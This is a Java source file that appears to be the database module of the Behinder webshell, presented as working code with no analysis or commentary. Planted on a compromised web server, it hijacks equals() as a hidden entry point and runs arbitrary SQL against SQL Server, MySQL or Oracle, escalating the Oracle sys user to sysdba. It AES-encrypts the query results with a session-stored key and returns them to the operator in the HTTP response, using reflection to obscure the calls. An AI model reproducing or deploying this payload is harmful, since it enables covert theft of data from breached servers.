package net.rebeyond.behinder.payload.java;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.ResultSetMetaData;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class Database {
    public static String database;
    public static String host;
    public static String pass;
    public static String port;
    public static String sql;
    public static String type;
    public static String user;
    private Object Request;
    private Object Response;
    private Object Session;

    public boolean equals(Object obj) {
        Map<String, String> result = new HashMap<>();
        try {
            fillContext(obj);
            executeSQL();
            result.put("msg", executeSQL());
            result.put("status", "success");
            try {
                Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                so.getClass().getMethod("write", byte[].class).invoke(so, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
                so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
            } catch (Exception e) {
            }
        } catch (Exception e2) {
            result.put("status", "fail");
            if (e2 instanceof ClassNotFoundException) {
                result.put("msg", "NoDriver");
            } else {
                result.put("msg", e2.getMessage());
            }
            try {
                Object so2 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                so2.getClass().getMethod("write", byte[].class).invoke(so2, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                so2.getClass().getMethod("flush", new Class[0]).invoke(so2, new Object[0]);
                so2.getClass().getMethod("close", new Class[0]).invoke(so2, new Object[0]);
            } catch (Exception e3) {
            }
        } catch (Throwable th) {
            try {
                Object so3 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                so3.getClass().getMethod("write", byte[].class).invoke(so3, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                so3.getClass().getMethod("flush", new Class[0]).invoke(so3, new Object[0]);
                so3.getClass().getMethod("close", new Class[0]).invoke(so3, new Object[0]);
            } catch (Exception e4) {
            }
            throw th;
        }
        return true;
    }

    public String executeSQL() throws Exception {
        String driver = null;
        String url = null;
        if (type.equals("sqlserver")) {
            driver = "com.microsoft.sqlserver.jdbc.SQLServerDriver";
            url = "jdbc:sqlserver://%s:%s;DatabaseName=%s";
        } else if (type.equals("mysql")) {
            driver = "com.mysql.jdbc.Driver";
            url = "jdbc:mysql://%s:%s/%s";
        } else if (type.equals("oracle")) {
            driver = "oracle.jdbc.driver.OracleDriver";
            url = "jdbc:oracle:thin:@%s:%s:%s";
            if (user.equals("sys")) {
                user += " as sysdba";
            }
        }
        String url2 = String.format(url, host, port, database);
        Class.forName(driver);
        Connection con = DriverManager.getConnection(url2, user, pass);
        ResultSet rs = con.createStatement().executeQuery(sql);
        ResultSetMetaData metaData = rs.getMetaData();
        int count = metaData.getColumnCount();
        String[] colNames = new String[count];
        for (int i = 0; i < count; i++) {
            colNames[i] = metaData.getColumnLabel(i + 1);
        }
        String result = "[" + "[";
        for (int i2 = 0; i2 < colNames.length; i2++) {
            result = result + String.format("{\"name\":\"%s\"}", colNames[i2]) + ",";
        }
        String result2 = result.substring(0, result.length() - 1) + "],";
        Map<String, Object> linkedHashMap = new LinkedHashMap<>();
        List<Map<String, Object>> recordList = new ArrayList<>();
        while (rs.next()) {
            String result3 = result2 + "[";
            for (String col : colNames) {
                linkedHashMap.put(col, rs.getObject(col));
                result3 = result3 + "\"" + rs.getObject(col) + "\",";
            }
            recordList.add(linkedHashMap);
            result2 = result3.substring(0, result3.length() - 1) + "],";
        }
        String result4 = result2.substring(0, result2.length() - 1) + "]";
        rs.close();
        con.close();
        return result4;
    }

    private byte[] Encrypt(byte[] bs) throws Exception {
        SecretKeySpec skeySpec = new SecretKeySpec(this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString().getBytes("utf-8"), "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        return cipher.doFinal(bs);
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        for (String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = entity.get(key).toString();
            if (encode) {
                if (version.compareTo("1.9") >= 0) {
                    getClass();
                    Class Base64 = Class.forName("java.util.Base64");
                    Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
                    value = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                } else {
                    getClass();
                    Object Encoder2 = Class.forName("sun.misc.BASE64Encoder").newInstance();
                    value = ((String) Encoder2.getClass().getMethod("encode", byte[].class).invoke(Encoder2, value.getBytes("UTF-8"))).replace("\n", "").replace("\r", "");
                }
            }
            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("}");
        return sb.toString();
    }

    private void fillContext(Object obj) throws Exception {
        if (obj.getClass().getName().indexOf("PageContext") >= 0) {
            this.Request = obj.getClass().getMethod("getRequest", new Class[0]).invoke(obj, new Object[0]);
            this.Response = obj.getClass().getMethod("getResponse", new Class[0]).invoke(obj, new Object[0]);
            this.Session = obj.getClass().getMethod("getSession", new Class[0]).invoke(obj, new Object[0]);
        } else {
            Map<String, Object> objMap = (Map) obj;
            this.Session = objMap.get("session");
            this.Response = objMap.get("response");
            this.Request = objMap.get("request");
        }
        this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
    }
}
